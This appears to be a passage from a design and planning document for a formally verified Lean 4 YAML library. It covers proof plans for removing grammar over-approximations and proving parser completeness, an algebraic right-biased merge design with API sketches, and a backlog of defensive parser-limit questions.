| **A** | `scannerDrop` | 1 (line 481) | `pendingFlow` lacks grammar evidence for flow indicators |
| **B** | `directiveDrop` | 7 (lines 505, 1138, 1162, 1334, 1346, 2794, 2814) | orphaned directives not mapped to grammar productions |

---

### Fix A: Eliminating `scannerDrop` — Flow Indicator Grammar Evidence

#### Current state

`PendingNode.pendingFlow` (`StreamAccum.lean:134–136`) is used when the scanner processes flow indicators. It carries only the stream at block level:

```lean
| pendingFlow (sp_start sp_block sp_scan : SurfPos)
    (h_stream : SLYamlStream sp_start sp_block) :
    PendingNode sp_start sp_block sp_scan
```

The gap `sp_block → sp_scan` is opaque; at close time, `scannerDrop` absorbs it.

#### Required change

Add an `h_closable` field, matching the pattern of `pendingContent` (`StreamAccum.lean:93–97`):

```lean
| pendingFlow (sp_start sp_block sp_scan : SurfPos)
    (h_closable : ∀ sp_mid,
      SSLComments sp_scan sp_mid →
      SLYamlStream sp_start sp_mid) :
    PendingNode sp_start sp_block sp_scan
```

Then at dispatch time (in `accum_step_flow`, §1c, `StreamAccum.lean:1451`), construct the closure by composing:
1. `SFlowSequence` / `SFlowMapping` evidence from `_prod` theorems
2. `SBlockNode.flowInBlock` wrapping (`Surface/Node.lean:89`)
3. Stream extension via `implicitContinue`

#### Blocking issue

Recorded as root cause 1 in `StreamAccum.lean`'s §6 Gap Analysis
(`:3264–3272` — the block is marked *historical* because the file's sorries
were discharged, but they were discharged **via** `scannerDrop`; this
obligation is what remains once the escape hatch is removed):

> Blocked on 4i: `_prod` theorems give `SFlowNode 0 .blockIn` but `flowInBlock` needs `SFlowNode (n+1) .flowOut`.

The existing `_prod` theorems (Phase B/C coupling proofs) produce grammar evidence with context parameter `n=0, ctx=blockIn`. But `SBlockNode.flowInBlock` requires `SFlowNode (n+1) .flowOut`. A **context parameter lifting lemma** is needed:

```lean
theorem SFlowNode_context_lift (n : Nat) (ctx : Context) :
    SFlowNode 0 .blockIn sp sp' → SFlowNode (n+1) .flowOut sp sp'
```

This is provable because flow content parsing doesn't depend on block indent level — the grammar rules for `SFlowSequence`, `SFlowMapping`, and `SFlowNode` (`Surface/Node.lean:291/349/245`) are insensitive to `n` and `ctx` at the character level.

#### Estimated scope

- Context lifting lemma: ~200 lines (one mutual induction over flow grammar types)
- `h_closable` construction in `accum_step_flow`: ~100 lines
- `pendingFlow` definition change: ~10 lines
- `close_with_ssl` pendingFlow arm: ~5 lines (delegates to `h_closable`)
- **Total: ~300–500 lines**

---

### Fix B: Eliminating `directiveDrop` — Orphaned Directive Resolution

#### Scanner behaviour — audit result (2026-08-01, Step 0 done)

Post-reorg locations: the scan pipeline lives in
`L4YAML/Scanner/Scanner.lean` (dispatchers
`scanNextToken_dispatchStructural` at :293,
`scanNextToken_dispatchContent` at :366) and directives are scanned by
`scanDirective` in `L4YAML/Scanner/Document.lean:243` (guard
`c == '%' && s.col == 0` at `Scanner/Scanner.lean:307–309`).

The "directives require `---`" rule is enforced only **partially**. The
error constructor exists — `ScanError.directiveWithoutDocument`
(`Token/Token.lean:316`) — and fires in two situations:

1. **EOF after directives**: `scanLoop` (`Scanner/Scanner.lean:495–497`)
   and `scanLoopFull` (`:555–556`) error when
   `directivesPresent && !documentEverStarted`.
2. **`...` after directives**: `scanDocumentEnd`
   (`Scanner/Document.lean:318–319`).

But the **mid-stream path is lenient**: if a directive is followed by
ordinary content (e.g. `%YAML 1.2\nfoo: bar`), `scanNextToken`
(`Scanner/Scanner.lean:444–449`) sets `documentEverStarted := true`
("Any non-directive, non-document-marker content means we're in a
document"), which suppresses check 1. No error fires; the directives are
orphaned. **This is exactly the path `directiveDrop` absorbs — it is
reachable, not dead code.**

#### What the YAML spec says

YAML 1.2.2 §9.1.4 (production [205]): a directive document REQUIRES
`c-directives-end` (`---`). Orphaned directives are not valid YAML; the
lenient path is scanner leniency beyond the spec.

#### Resolution options

- **(c) Strengthen the scanner — recommended.** Raise
  `directiveWithoutDocument` in the directive-then-content branch, making
  the lenient path an error like the EOF and `...` cases already are. The
  "close `pendingDirective` without `---`" path becomes unreachable, and
  `directiveDrop` is eliminated by an impossibility proof. Runtime
  behaviour changes only on spec-invalid inputs. ~100 lines of proof
  (plus the scanner change and its `_prod`/strictness lemma updates).
- **(b) Keep the leniency**: prove the parser also accepts
  directive-then-content inputs and extend grammar evidence
  (`SLDocumentPrefix` with directive absorption). ~500 lines, and the
  grammar then over-approximates the spec by design.

#### Estimated scope

**Total: ~100–500 lines** depending on the option chosen.

---

### Implementation Plan

- **Step 0 (✅ done 2026-08-01)**: scanner directive audit — findings
  above; decision needed between options (b)/(c), recommendation (c).
- **Step 1**: delete `directiveDrop` and `scannerDrop` from
  `Surface/Document.lean`. The build breaks **only** at the 8
  construction sites in `StreamAccum.lean` (verified — no case analysis
  on `SLYamlStream` exists anywhere).
- **Step 2 (Fix A)**: prove `SFlowNode_context_lift`; change
  `pendingFlow` to carry `h_closable`; construct it at the
  `accum_step_flow` dispatch sites; update `close_with_ssl`.
- **Step 3 (Fix B)**: per the Step 0 decision — strengthen the scanner
  and prove the `pendingDirective` close path unreachable (option c), or
  construct directive-absorbing grammar evidence (option b).
- **Step 4**: full rebuild. `scan_strict_proof` / `parse_strict_proof`
  are automatically strengthened.
- **Step 5**: prove the converse:
  ```lean
  theorem grammar_completeness (input : String) (h : InYamlLanguage input) :
      ∃ docs, parseYaml input = .ok docs
  ```
  This inverts the 3-constructor `SLYamlStream` into scanner+parser
  success — the library's first rule inversion on this inductive.
- **Step 6**: assemble the biconditional from `parse_strict_proof` +
  `grammar_completeness`.

---

### Existing Infrastructure

#### Forward direction (parse → grammar): v0.4.6

| Module | Role | LOC (2026-08-01) |
|--------|------|-----|
| `Proofs/Production/StreamAccum.lean` | Threads `SLYamlStream` through the scan loop (26 sub-layers) | 3,322 |
| `Proofs/Production/DocumentProduction.lean` | Composes stream/document-level productions | 261 |
| `Proofs/Scanner/ScanStrictCoupling.lean` | Bridges scanner state to surface positions | 497 |
| `Proofs/Coupling/ScalarCoupling.lean` | Scalar `_prod` theorems (double/single/plain/block) | 765 |
| `Proofs/Coupling/StructureCoupling.lean` | Flow/block indicator productions | 652 |
| `Proofs/Production/StructureProduction.lean` | Node-level grammar composition | 1,315 |

Further coupling material is spread across `Proofs/Coupling/`
(`ScannerCoupling.lean`, `SurfaceCoupling.lean`, `CouplingBridge.lean`)
and `Proofs/Scanner/`.

#### Surface grammar: 77 inductive rules (counts verified 2026-08-01)

| File | Rules | Content |
|------|-------|---------|
| `Combinators.lean` | 10 | Generic: `GChar`, `GLit`, `GSeq`, `GSeq3`, `GAlt`, `GStar`, `GPlus`, `GOpt`, `GEps`, `GConsumeAll` |
| `Basic.lean` | 16 | Line breaks, whitespace, indentation, comments, directives |
| `Scalars.lean` | 23 | Double/single-quoted, plain, literal, folded scalars |
| `Node.lean` | 18 | Mutual block/flow collection types (one mutual block) |
| `Document.lean` | 10 | Document markers, types, stream-level rules |

---

### Risk Assessment

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|--------|------------|
| Context parameter lifting is harder than expected | Medium | HIGH | The grammar rules are structurally insensitive to `n`/`ctx`; mutual induction over the flow types should work |
| Orphaned directives reachable in the scanner | **Confirmed** (mid-stream leniency) | Medium | Option (c) strengthens the scanner; runtime change on spec-invalid inputs only |
| Removing constructors breaks downstream files | None (verified) | — | No case analysis on `SLYamlStream` exists anywhere; only the 8 construction sites break |
| Converse proof (Step 5) is very large | High | Medium | Grammar inversion touches ~77 rules; many lemmas are mechanical |

---

### Success Criteria

- `directiveDrop` and `scannerDrop` removed from `SLYamlStream`
- `scan_strict_proof` and `parse_strict_proof` still compile with 0 sorry (stronger)
- `grammar_completeness` and `parse_iff_grammar` compile with 0 sorry
- All existing v0.4.6/v0.4.7 proof files maintain 0 sorry
- `parse_iff_grammar` (and `grammar_completeness`, if it stays a
  top-level declaration) added to the `theorem` whitelist in
  `scripts/capstones.txt` (a commented slot for capstone 7.7 is already
  reserved there) and `@[capstone]`-tagged with its axiom profile pinned
  in `L4YAML/Capstones.lean` — every non-whitelisted declaration must use
  `lemma` (`Blueprint/06-discipline.md` Rule 7; enforced by
  `scripts/check-theorem-keyword.sh`)

---

### Estimated Scope

#### Phase 1: eliminate over-approximation constructors (Steps 1–4)

| Component | LOC estimate |
|-----------|-------------|
| Remove constructors from `Document.lean` | ~10 |
| Fix A: context lifting + `pendingFlow` `h_closable` | 300–500 |
| Fix B: orphaned directive resolution | 100–500 |
| **Phase 1 subtotal** | **400–1,000** |

#### Phase 2: prove the converse (Steps 5–6)

| Component | LOC estimate |
|-----------|-------------|
| Grammar inversion lemmas (77 rules) | 2,000–3,500 |
| `parseStream` acceptance from extracted tokens | 500–1,000 |
| Biconditional assembly | ~100 |
| **Phase 2 subtotal** | **2,500–4,500** |

#### Total: **3,000–5,500 lines**

---

## Merge semantics plan

*(was `YAML_MERGE.md` — "YAML Value Merge: Algebraic Semantics"; consolidated into this file 2026-08-01, file-level history in git)*

> **Audit note (2026-07-31):** This design remains a live candidate plan, but
> its stated foundation has shifted. The `KeyEqPred` typeclass from the
> retired `DUPLICATE_KEYS.md` design (deleted 2026-08-01; its surviving
> rationale — §3.2.1.3 schema-dependent key equality and the per-binding
> first-wins/last-wins table — is folded into
> [Blueprint/08 §LoadConfig](Blueprint/08-initiative-4-intrinsic-foundations.md))
> was **never built** — key equality in
> the library is the proved `LawfulBEq YamlValue` instance
> (`L4YAML/Algebra/LawfulBEq.lean:266`). Any implementation should be re-based
> on `LawfulBEq`: `==` is already a lawful (decidable) equivalence, which
> subsumes the `KeyEqPred.refl`/`symm`/`trans` obligations invoked below. The
> natural landing site is the `.merge` arm of `DuplicateKeyPolicy` in
> `L4YAML/Config/LoadConfig.lean` — this document is the candidate design for
> that combinator (`dedupMerge` is explicitly deferred in
> `L4YAML/Algebra/Equivalence.lean` pending exactly such a parser-supplied
> combinator; see `Blueprint/08-initiative-4-intrinsic-foundations.md`,
> Phase 4).

### Motivation

Configuration systems routinely need to combine multiple YAML files —
defaults with overrides, base configs with environment-specific layers,
shared templates with local customizations.  Today this is handled by
ad-hoc scripts or language-specific libraries (Python `deepmerge`,
Kubernetes strategic merge patches, Helm value overlays) with no formal
specification of merge behavior.

We define `merge : YamlValue → YamlValue → YamlValue` with precise
algebraic laws, provable in Lean 4, that guarantee predictable behavior
across any number of layered configurations.

### Required Algebraic Laws

The merge operation must satisfy three properties:

#### 1. Idempotence (Reflexivity)

```
∀ y : YamlValue, merge y y = y
```

Merging a document with itself produces itself — no duplication, no
structural inflation.  This is the essential safety property for
configuration layering: applying the same overlay twice is harmless.

#### 2. Antisymmetry (Argument Order Matters)

```
∀ y₁ y₂ : YamlValue, merge y₁ y₂ = merge y₂ y₁ → y₁ = y₂
```

Merge is **not** commutative — the right argument takes precedence on
conflicts.  This is exactly the override semantics that configuration
layering requires: `merge(defaults, overrides)` is different from
`merge(overrides, defaults)`.  The two results coincide only when the
inputs are equal.

#### 3. Associativity

```
∀ y₁ y₂ y₃ : YamlValue, merge y₁ (merge y₂ y₃) = merge (merge y₁ y₂) y₃
```

Multi-file merges can be folded left or right with the same result.
This enables `foldl merge base [layer1, layer2, layer3]` without
worrying about evaluation order.  Essential for composable pipelines.

#### Algebraic Structure

Together, these three laws make `(YamlValue, merge)` a **band** (idempotent
semigroup) that is *right-biased* and *anti-commutative*.  This is the
standard algebraic structure for override-merge in configuration management.

### Design

#### Merge Semantics by Node Kind

The merge is defined by structural recursion on the pair `(left, right)`:

| Left | Right | Result | Rationale |
|------|-------|--------|-----------|
| any | `y` (same kind + tag) | deep merge | Recurse structurally |
| scalar | scalar | right wins | Right-biased override |
| sequence | sequence | right wins | Sequences are atomic — no element-wise merge (see Design Decisions) |
| mapping | mapping | deep key merge | Union of keys; on conflict, recursively merge values |
| any | different kind | right wins | Kind mismatch = replacement |

#### Core Definition

```lean
/-- Right-biased deep merge of YAML value trees.

    Forms an idempotent semigroup (band) on `YamlValue`:
    - `merge_idempotent : merge y y = y`
    - `merge_assoc : merge y₁ (merge y₂ y₃) = merge (merge y₁ y₂) y₃`
    - `merge_antisymm : merge y₁ y₂ = merge y₂ y₁ → y₁ = y₂`

    For mappings, keys are matched using `keyEq` and values are merged
    recursively.  For all other node kinds, the right argument wins. -/
def merge (keyEq : YamlValue → YamlValue → Bool) [KeyEqPred keyEq]
    : YamlValue → YamlValue → YamlValue
  | .mapping st₁ pairs₁ tag₁ anc₁, .mapping st₂ pairs₂ tag₂ anc₂ =>
    if tag₁ == tag₂ then
      let merged := mergeMappingPairs keyEq pairs₁ pairs₂
      .mapping st₂ merged tag₂ anc₂
    else
      .mapping st₂ pairs₂ tag₂ anc₂  -- tag mismatch: right wins entirely
  | _, right => right

where
  /-- Merge two mapping pair arrays.

      Start with `left` pairs.  For each pair `(k₂, v₂)` in `right`:
      - If `left` contains `(k₁, v₁)` with `keyEq k₁ k₂ = true`:
        replace with `(k₂, merge keyEq v₁ v₂)` (recursive).
      - Otherwise: append `(k₂, v₂)` to the result.

      This preserves the order of `left` keys, appending new `right` keys
      at the end. -/
  mergeMappingPairs (keyEq : YamlValue → YamlValue → Bool)
      (left right : Array (YamlValue × YamlValue))
      : Array (YamlValue × YamlValue) :=
    right.foldl (init := left) fun acc (k₂, v₂) =>
      match acc.findIdx? (fun (k₁, _) => keyEq k₁ k₂) with
      | some idx =>
        let (_, v₁) := acc[idx]!
        acc.set! idx (k₂, merge keyEq v₁ v₂)
      | none => acc.push (k₂, v₂)
```

#### Relationship to `KeyEqPred` (Duplicate Keys)

The merge operation was drafted against the `KeyEqPred` typeclass of the
retired `DUPLICATE_KEYS.md` design (never built — re-base on `LawfulBEq`,
per the audit note above).  The same key equality predicate
determines both:

- When two keys in a single mapping are "duplicates"
- When a key in the right document "overrides" a key in the left document

This is not coincidental — the merge of two mappings must produce a mapping
with unique keys (under `keyEq`), which is exactly the duplicate-key contract.

**Theorem**: If both inputs have unique keys (under `keyEq`) and `KeyEqPred keyEq`
holds, then `merge keyEq y₁ y₂` has unique keys.

#### Merge Configuration

```lean
/-- Configuration for YAML merge operations. -/
structure MergeConfig where
  /-- Key equality predicate for matching mapping keys across documents. -/
  keyEq : YamlValue → YamlValue → Bool := defaultScalarEq
  /-- Strategy for sequence merging.  Default: right-wins (atomic replace).
      Alternative strategies can be provided for specific use cases. -/
  sequenceStrategy : SequenceMergeStrategy := .replace
  /-- Whether to merge across different tags.  Default: false (tag mismatch
      means right wins entirely).  If true, merge structurally regardless
      of tag differences. -/
  mergeAcrossTags : Bool := false

/-- Strategy for merging sequences. -/
inductive SequenceMergeStrategy where
  /-- Right sequence replaces left entirely (default).
      Required for associativity — element-wise strategies break it. -/
  | replace
  /-- Append right elements after left elements.
      WARNING: satisfies associativity but NOT idempotence. -/
  | append
  /-- Concatenate and deduplicate (by value equality).
      WARNING: satisfies idempotence but NOT associativity. -/
  | union
```

Only `SequenceMergeStrategy.replace` satisfies all three laws simultaneously.
The alternatives are provided for practical use cases where applications
accept weaker guarantees, but the proof obligations are adjusted accordingly.

### Proof Obligations

#### Core Theorems

| Theorem | Statement | Difficulty |
|---------|-----------|------------|
| `merge_idempotent` | `merge keyEq y y = y` | Medium — structural induction on `YamlValue`, mapping case needs `foldl` idempotence over identical pairs |
| `merge_assoc` | `merge keyEq y₁ (merge keyEq y₂ y₃) = merge keyEq (merge keyEq y₁ y₂) y₃` | Hard — the mapping case requires showing `foldl` over merged pairs is associative, using `KeyEqPred.trans` |
| `merge_antisymm` | `merge keyEq y₁ y₂ = merge keyEq y₂ y₁ → y₁ = y₂` | Hard — contrapositive: if `y₁ ≠ y₂`, exhibit a difference preserved by the right-bias |
| `merge_preserves_uniqueness` | If both inputs have unique keys under `keyEq`, so does the output | Medium — `foldl` preserves the no-duplicate invariant |

#### Proof Strategy

**Idempotence** is the most approachable:
- Scalar/sequence/alias cases: `merge y y = y` by definition (right wins = same value).
- Mapping case: `tag₁ == tag₂` is `true` (same tag). Then show `mergeMappingPairs keyEq pairs pairs = pairs`:
  - By `foldl` induction: each `(k, v)` from `right` finds its match in `acc` at the same position (by `KeyEqPred.refl`), replaces with `(k, merge keyEq v v)` which equals `(k, v)` by IH.

**Associativity** requires the key insight that `mergeMappingPairs` acts like
a right-biased association table update, and `foldl` over such updates is
associative when the lookup predicate is an equivalence relation.  Specifically:

```
mergeMappingPairs keyEq (mergeMappingPairs keyEq p₁ p₂) p₃
  = mergeMappingPairs keyEq p₁ (mergeMappingPairs keyEq p₂ p₃)
```

This follows from:
1. `findIdx?` with a transitive `keyEq` produces the same match regardless
   of whether keys were inserted via merge from `p₁` or `p₂`.
2. Recursive merge on values is associative by induction hypothesis.
3. `KeyEqPred.trans` ensures that if `k₁ ≡ k₂` and `k₂ ≡ k₃`, the merged
   key from `p₁ ∪ p₂` still matches `k₃`.

**Antisymmetry** is proved by contrapositive:
- If `y₁ ≠ y₂`, there exists some structural difference.
- Scalar/sequence: `merge y₁ y₂ = y₂` and `merge y₂ y₁ = y₁`, so
  `y₂ ≠ y₁` implies `merge y₁ y₂ ≠ merge y₂ y₁`.
- Mapping: if key sets differ, one merge appends keys the other doesn't (order
  changes). If a shared key has different values, the right-bias means the two
  merges produce different values for that key.

#### Proof Dependencies

```
KeyEqPred.refl  ──→ merge_idempotent
KeyEqPred.trans ──→ merge_assoc
KeyEqPred.symm  ──→ merge_antisymm
                    merge_preserves_uniqueness
```

All three `KeyEqPred` laws are needed — this validates the typeclass design
from the duplicate keys work.

### Interaction with YAML `<<` Merge Key

The YAML 1.1 merge key `<<` (https://yaml.org/type/merge.html) is a
**different** concept:

| Aspect | `<<` merge key | `merge(y₁, y₂)` |
|--------|----------------|-------------------|
| Scope | Within a single document | Across documents |
| Trigger | Special key `<<` with alias value | Explicit API call |
| Spec status | YAML 1.1 type; **not** in YAML 1.2.2 core schema | Application-level operation |
| Implementation | Expand during composition (resolve aliases first) | Post-parse pipeline step |

The `<<` key is currently treated as a literal string key by the parser
(correct for YAML 1.2.2).  Support for `<<` as a merge directive would be a
separate feature — an optional composition step that expands `<<` entries
before the value tree is returned.

The `merge(y₁, y₂)` operation defined here operates on fully composed,
alias-resolved value trees.

### API Surface

#### Lean API

```lean
/-- Merge two YAML values with default configuration (right-biased, reject
    on key equality using `defaultScalarEq`). -/
def YamlValue.merge (left right : YamlValue) : YamlValue :=
  L4YAML.merge defaultScalarEq left right

/-- Merge two YAML values with custom key equality. -/
def YamlValue.mergeWith (keyEq : YamlValue → YamlValue → Bool) [KeyEqPred keyEq]
    (left right : YamlValue) : YamlValue :=
  L4YAML.merge keyEq left right

/-- Merge a base document with a sequence of overlay documents. -/
def YamlValue.mergeAll (keyEq : YamlValue → YamlValue → Bool) [KeyEqPred keyEq]
    (base : YamlValue) (overlays : Array YamlValue) : YamlValue :=
  overlays.foldl (L4YAML.merge keyEq) base
```

#### C API

```c
// Merge two parsed YAML values
void *l4yaml_merge(void *left, void *right);
void *l4yaml_merge_with_config(void *left, void *right, void *merge_cfg);

// Merge multiple documents
void *l4yaml_merge_all(void **docs, int count, void *merge_cfg);
```

#### Python API

```python
import l4yaml

base = l4yaml.load("base.yaml")
overlay = l4yaml.load("overlay.yaml")

# Right-biased deep merge
result = l4yaml.merge(base, overlay)

# Merge multiple layers (left fold)
result = l4yaml.merge_all(base, [layer1, layer2, layer3])

# With custom config
result = l4yaml.merge(base, overlay, key_equality="content_only")
```

### Examples

#### Basic Override

```yaml
# base.yaml
server:
  host: localhost
  port: 8080
  debug: false

# overlay.yaml
server:
  port: 9090
  debug: true
  tls: true
```

```
merge(base, overlay) =
  server:
    host: localhost    # from base (no conflict)
    port: 9090         # from overlay (right wins)
    debug: true        # from overlay (right wins)
    tls: true          # from overlay (new key appended)
```

#### Associativity in Practice

```yaml
# defaults.yaml          # env.yaml              # local.yaml
server:                   server:                  server:
  host: 0.0.0.0            host: prod.example.com   port: 3000
  port: 8080                port: 443
  debug: false              debug: false
```

Both evaluation orders produce the same result:

```
merge(defaults, merge(env, local))
  = merge(merge(defaults, env), local)
  = server:
      host: prod.example.com
      port: 3000
      debug: false
```

#### Idempotence

```
merge(config, config) = config    -- always, for any config
```

This guarantees that accidentally applying the same layer twice is harmless.

### Implementation Plan

#### Phase 1: Core Merge (depends on DuplicateKeys Phase 1)

1. Define `merge` and `mergeMappingPairs` in `L4YAML/Merge.lean`
2. Reuse `KeyEqPred` from `L4YAML/DuplicateKeys.lean`
3. Define `MergeConfig` and `SequenceMergeStrategy`
4. Add `#guard` tests in `Tests/Guards/MergeGuards.lean`

#### Phase 2: Proofs

5. Prove `merge_idempotent` — structural induction + `foldl` lemma
6. Prove `merge_assoc` — `foldl` associativity under `KeyEqPred.trans`
7. Prove `merge_antisymm` — contrapositive argument
8. Prove `merge_preserves_uniqueness`

#### Phase 3: FFI and Python

9. C API in `ffi/l4yaml_shim.c`
10. Python bindings: `merge()`, `merge_all()`
11. Python tests

#### Phase 4: Extended (future)

12. `<<` merge key expansion as optional composition step
13. Strategic merge patches (Kubernetes-style `$patch: delete`)
14. Conflict reporting — return `MergeResult` with diagnostics alongside value

### Files

| File | Change | Impact |
|------|--------|--------|
| `L4YAML/Merge.lean` | **NEW** | Core merge algorithm + config types |
| `L4YAML/Proofs/MergeProofs.lean` | **NEW** | All merge theorems |
| `L4YAML/FFI/FFI.lean` | New `@[export]` functions | Additive |
| `Tests/Guards/MergeGuards.lean` | **NEW** | Compile-time `#guard` tests |
| `Tests/test_python_ffi.py` | Add merge tests | Additive |
| `ffi/l4yaml.h` | New C API functions | Additive |
| `ffi/l4yaml_shim.c` | Shim implementations | Additive |
| `python/l4yaml/__init__.py` | `merge()`, `merge_all()` | Additive |
| Scanner, TokenParser, all Proofs/* | **UNCHANGED** | Zero impact |

### Design Decisions

- **Sequences are atomic (right-wins)**: Element-wise sequence merge breaks
  associativity.  `merge([a,b], [c]) = [a,b,c]` but then
  `merge([a,b,c], [d])` appends `d`, while `merge([a,b], merge([c],[d]))` =
  `merge([a,b], [c,d])` = `[a,b,c,d]`.  The only strategy satisfying all
  three laws for sequences is atomic replacement.  Alternative strategies
  (`append`, `union`) are available for applications that accept weaker
  guarantees.

- **Right-biased, not left-biased**: The convention `merge(base, overlay)` is
  universal in configuration management (Helm, Kustomize, Nix, etc.).
  Right-bias means "later layers win," matching natural reading order:
  `merge(defaults, env_specific, local_overrides)`.

- **Tag mismatch = replacement**: If the left mapping has `!!myapp/config` and
  the right has `!!myapp/secrets`, they represent different schemas — deep
  merging would be meaningless.  `mergeAcrossTags` can be set to `true`
  for applications that ignore tags.

- **Style from right**: The merged mapping takes the `CollectionStyle` from
  the right (overlay) document.  The right document is the "most recent"
  specification of how the mapping should be presented.

- **Reuses `KeyEqPred`**: A single typeclass governs key identity across
  duplicate detection and merging — no risk of inconsistent key comparison
  between the two features.

- **`merge` is total**: No `Except`, no `Option` — merge always succeeds.
  This is a deliberate departure from the duplicate-key path, where the
  spec-strict default `DuplicateKeyPolicy.error`
  (`L4YAML/Config/LoadConfig.lean`) fails on duplicates.  Merge is a pure
  structural combination; errors belong to the validation layer.

## Security hardening backlog

*(moved from `LIMITS.md` §Open Questions / §Future Work — the runtime
feature set is landed; these are the design questions never formally
closed and the features never built)*

### Open Questions

1. **Should we enforce limits by default?**
   - **Option A**: `ParserLimits.default` (current proposal) — medium strictness, enforced unless `limits := .unlimited`
   - **Option B**: `ParserLimits.unlimited` by default — backwards compatible, opt-in security
   - **Recommendation**: Option A. Security-by-default is better; users needing unlimited can opt out explicitly.

2. **Should `compose` fail on limit violations or silently truncate?**
   - **Option A**: Fail with `Except` (current proposal) — clear error feedback
   - **Option B**: Truncate and emit warning — partial parsing, no hard failure
   - **Recommendation**: Option A. Partial parsing breaks YAML semantics (alias substitution is all-or-nothing).

3. **Should limits be per-document or per-stream?**
   - Current proposal: hybrid (some per-document like `maxAnchors`, some per-stream like `maxInputBytes`)
   - Alternative: all limits per-stream, aggregate across documents
   - **Recommendation**: Keep hybrid. Per-document limits prevent one malicious document from poisoning a multi-document stream.

4. **How to handle limit violations in streaming contexts?**
   - If `parseYaml` processes multi-document streams, should one limit violation abort the entire stream or skip that document?
   - **Recommendation**: Abort entire stream. Partial success is confusing; user can parse documents individually if needed.

5. **Should we add a `maxDepth` to alias chains separately from collection nesting?**
   - Current: `maxAliasDepth` (chain length) + `maxDepth` (collection nesting) are independent
   - Alternative: single combined depth limit
   - **Recommendation**: Keep separate. They measure different things: `maxAliasDepth` bounds resolution passes, `maxDepth` bounds stack usage.

### Future Work

#### 1. Incremental Parsing with Limits

Streaming parser that enforces limits **before** buffering entire input:

```lean
def parseYamlStreaming (stream : IO.FS.Stream) (limits : ParserLimits := {})
    : IO (Except String (Array YamlDocument)) := do
  let mut bytesRead := 0
  let mut buffer := ""

  for chunk in stream.readChunks do
    bytesRead := bytesRead + chunk.utf8ByteSize
    if bytesRead > limits.document.maxInputBytes then
      return .error s!"input stream exceeds {limits.document.maxInputBytes} bytes"
    buffer := buffer ++ chunk

  parseYaml buffer limits
```

**Benefit**: Rejects huge inputs without allocating memory for entire string.

#### 2. Resource Tracking

More sophisticated limits based on actual resource consumption:

```lean
structure ResourceLimits where
  maxMemoryBytes : Nat := 100_000_000  -- 100 MB
  maxCpuMilliseconds : Nat := 5_000     -- 5 seconds
```

**Benefit**: Protects against classes of attacks not covered by structural limits (e.g., pathological regex backtracking in tag patterns).

**Challenges**: Requires FFI to OS-level resource APIs; hard to reason about in proofs.

#### 3. Fuzzing with Limits

Use property-based testing to verify no false negatives:

```lean
/-- Property: If valid YAML parses without limits, it should parse with generous limits -/
def prop_limits_no_false_negatives (yaml : String) : Bool :=
  match (parseYaml yaml .unlimited, parseYaml yaml .permissive) with
  | (.ok docs₁, .ok docs₂) => docs₁ == docs₂  -- same result
  | (.ok _, .error _) => false                 -- false negative!
  | (.error _, _) => true                      -- either both fail or only limited fails
```

Use AFL/libFuzzer with this property to discover edge cases.

---


## Other open items

Collected from the reference sections above (each links back to its
context):

- **Limit-enforcement verification** — the ~13 proposed theorems in
  [Security limits § Proof Burden](#security-limits-and-tag-validation)
  (`limit_error_preserves_grammar`, `parse_respects_structural_limits`,
  `parse_failure_dichotomy`, …) are unproven, and the instrumented
  `resolveAliasesLimited` (`L4YAML/Config/Limits.lean:433`) is still
  `partial` — a termination-under-limits proof would target it. The
  runtime limits themselves are landed and tested.
- **Scanner-level §7.1 theorem never formalized** — from
  [Anchor and alias pipeline rationale](#anchor-and-alias-pipeline-rationale):
  `scan_aliases_have_prior_anchors` (every `.alias` token preceded by a
  matching `.anchor` in `scanFiltered` output) does not exist in the
  proof corpus. The runtime enforcement landed, and Gap #8 was closed at
  the parser level (`parseStream_output_aliases_resolve`), so this is
  open-but-non-blocking.
- **`#check_wb_interactions` linter never implemented** — from
  [Proof-breaking code patterns](#proof-breaking-code-patterns): the six
  detectors remain pseudocode and the implementation plan is declared
  historical. Optional; the motivating campaign is over.
- **Pattern 6 factoring unrecorded** — the `accum_content_pending`
  evidence-extraction duplication (~200 lines, confirmed in the pattern
  analysis) has no recorded refactoring outcome.
- ~~**`nb-char` [27] still spec-loose**~~ — **Fixed 2026-08-01** with
  the ns-char fix (see the
  [companion nb-char record](#companion-nb-char-fix-2026-08-01-same-day)):
  `isNbChar` is now `[27]`-exact and block-scalar bodies reject raw
  controls/BOM. Comment/directive-trailing text intentionally remains
  loose via the named `isCommentTextChar` predicate (documented
  deviation — stripped text, no semantic effect).
- **Strategic roadmap** — from the
  [Executive summary](#executive-summary): Phase 2 (Next) verified
  configuration validators; Phase 3 (Future) verified state machines /
  control logic; Phase 4 (Vision) verified supply chain. Program-level
  direction, not repo tasks.
